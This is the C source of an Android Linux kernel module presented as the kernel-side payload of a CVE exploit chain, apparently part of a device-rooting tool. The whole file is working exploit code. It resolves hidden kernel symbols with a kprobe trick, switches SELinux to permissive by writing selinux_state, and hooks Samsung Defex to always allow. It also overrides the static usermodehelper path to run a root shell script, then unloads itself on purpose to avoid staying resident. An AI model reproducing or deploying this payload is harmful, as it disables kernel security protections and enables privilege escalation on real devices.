// SPDX-License-Identifier: GPL-2.0
/*
 * GhostLock minimal kernel-side payload (CVE-2026-43284 chain, B5-9h-LKM).
 *
 * Loaded once through insmod from the init / vendor_modprobe domain by the
 * page-cache chain. It runs in kernel context, performs exactly the four steps
 * the chain needs, then returns an error so the module is not kept resident.
 *
 *   1. resolve arbitrary kernel symbols through kallsyms_lookup_name (obtained
 *      with the classic kprobe trick, because the symbol is not exported);
 *   2. optionally set SELinux permissive (module parameter "permissive",
 *      default 1) - the init-domain work that follows needs it;
 *   3. run one userspace command through call_usermodehelper (module parameter
 *      "cmd", default the inert /system/bin/true) after forcing
 *      subprocess_info->path to /system/bin/sh, which defeats
 *      CONFIG_STATIC_USERMODEHELPER_PATH="";
 *   4. optionally hook the Samsung Defex entry points (module parameter
 *      "defex", default 0). On non-Samsung kernels those symbols do not exist
 *      and the failure is recorded but not fatal.
 *
 * Differences from the upstream DFRoot LKM: the Samsung-specific behaviour is
 * opt-in, the command is a bounded module parameter instead of a hard-coded
 * string, the default command is inert, every step is logged for on-device
 * verification, and a missing mandatory symbol aborts before any state change.
 *
 * Returning -E2BIG is deliberate: a failing module_init makes the kernel unload
 * the module, so nothing stays resident.
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/ptrace.h>
#include <linux/string.h>
#include <linux/umh.h>

#define GLK_SCRIPT_MAX 256

/* One data block carries the whole run-time contract. The app locates the magic
 * in the `.ko` image it already writes into the page cache and fills the path;
 * nothing is passed on the insmod command line (the libcxx hook has no argv
 * slot), so this block is the only channel.
 *
 * Layout is part of the Kotlin contract (LkmImagePatch.KNOB_SIZE == 284):
 *   magic[8] | size | permissive | defex | restore_enforce | path_len | path[256]
 */
struct glk_knob {
    char magic[8];
    u32 size;
    u32 permissive;
    u32 defex;
    u32 restore_enforce;
    u32 path_len;
    char script_path[GLK_SCRIPT_MAX];
};

static struct glk_knob knob = {
    { 'G', 'L', 'K', 'K', 'N', 'O', 'B', '1' },
    sizeof(struct glk_knob), 1, 0, 0, 9, "/dev/null"
};

module_param_string(cmd, knob.script_path, sizeof(knob.script_path), 0400);
MODULE_PARM_DESC(cmd, "Script path passed to /system/bin/sh");

module_param_named(permissive, knob.permissive, uint, 0400);
MODULE_PARM_DESC(permissive, "Set SELinux permissive before running the script");

module_param_named(defex, knob.defex, uint, 0400);
MODULE_PARM_DESC(defex, "Hook Samsung Defex entry points when present");

/* The chain writes 0 here: SELinux restore is the script's last section. */
module_param_named(restore_enforce, knob.restore_enforce, uint, 0400);
MODULE_PARM_DESC(restore_enforce, "Restore SELinux enforcing after the script");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
typedef void *(*umh_setup_t)(const char *, char **, char **, gfp_t,
                             int (*)(struct subprocess_info *, struct cred *),
                             void (*)(struct subprocess_info *), void *);
typedef int (*umh_exec_t)(struct subprocess_info *, int);

static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    (void)p;
    regs->regs[0] = 0;         /* DEFEX_ALLOW */
    regs->pc = regs->regs[30]; /* skip the body, return to the caller */
    return 1;
}

static int __init ghostlock_init(void)
{
    static const char sh[] = "/system/bin/sh";
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, NULL, NULL };
    struct kprobe kln_kp;
    kallsyms_lookup_name_t get_addr;
    umh_setup_t umh_setup;
    umh_exec_t umh_exec;
    struct subprocess_info *info;
    bool *selinux_state = NULL;
    bool selinux_touched = false;
    int ret;

    if (knob.path_len >= sizeof(knob.script_path) ||
        knob.script_path[knob.path_len] != '\0' ||
        knob.script_path[0] != '/') {
        pr_err("ghostlock: invalid script path (len=%u)\n", knob.path_len);
        return -EINVAL;
    }
    argv[1] = knob.script_path;

    /* 1. arbitrary symbol resolution: kallsyms_lookup_name is not exported. */
    memset(&kln_kp, 0, sizeof(kln_kp));
    kln_kp.symbol_name = "kallsyms_lookup_name";
    ret = register_kprobe(&kln_kp);
    if (ret < 0) {
        pr_err("ghostlock: kallsyms_lookup_name unavailable (%d)\n", ret);
        return ret;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    /* 2. SELinux permissive (opt out with permissive=0). The first byte of
     * selinux_state is the "enforcing" flag; we keep the pointer so the finish
     * step can put the flag back. */
    if (knob.permissive || knob.restore_enforce) {
        selinux_state = (bool *)get_addr("selinux_state");
    }
    if (knob.permissive) {
        if (selinux_state == NULL) {
            pr_err("ghostlock: selinux_state not found; refusing to continue\n");
            return -EINVAL;
        }
        WRITE_ONCE(*selinux_state, false);
        selinux_touched = true;
        pr_info("ghostlock: selinux_state set permissive\n");
    } else {
        pr_info("ghostlock: permissive=0, SELinux untouched\n");
    }

    /* 3. optional Samsung Defex bypass (best effort; absence is not fatal). */
    if (knob.defex) {
        struct kprobe kp;
        memset(&kp, 0, sizeof(kp));
        kp.addr = (kprobe_opcode_t *)get_addr("task_defex_enforce");
        kp.pre_handler = defex_pre_handler;
        if (kp.addr != NULL && register_kprobe(&kp) == 0)
            pr_info("ghostlock: task_defex_enforce hooked\n");
        else
            pr_info("ghostlock: task_defex_enforce not hooked\n");
    }

    /* 4. run the userspace command through UMH. */
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (umh_setup == NULL || umh_exec == NULL) {
        pr_err("ghostlock: usermodehelper symbols missing\n");
        return -EINVAL;
    }
    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (info == NULL) {
        pr_err("ghostlock: call_usermodehelper_setup failed\n");
        return -EINVAL;
    }
    /* Defeat CONFIG_STATIC_USERMODEHELPER_PATH="" (which would blank the path). */
    info->path = sh;
    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("ghostlock: umh exec returned %d for path=%s\n", ret, knob.script_path);

    /* Finish (43499-style): the command has returned, so KernelSU either loaded
     * or failed; put SELinux back to enforcing when this module relaxed it. */
    if (selinux_touched && knob.restore_enforce) {
        WRITE_ONCE(*selinux_state, true);
        pr_info("ghostlock: selinux_state restored to enforcing\n");
    } else if (selinux_touched) {
        pr_info("ghostlock: restore_enforce=0, SELinux left permissive\n");
    }

    /* Deliberate failure so the module is unloaded and never stays resident. */
    return -E2BIG;
}

module_init(ghostlock_init);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("GhostLock minimal kernel-side payload");
MODULE_AUTHOR("GhostLock");
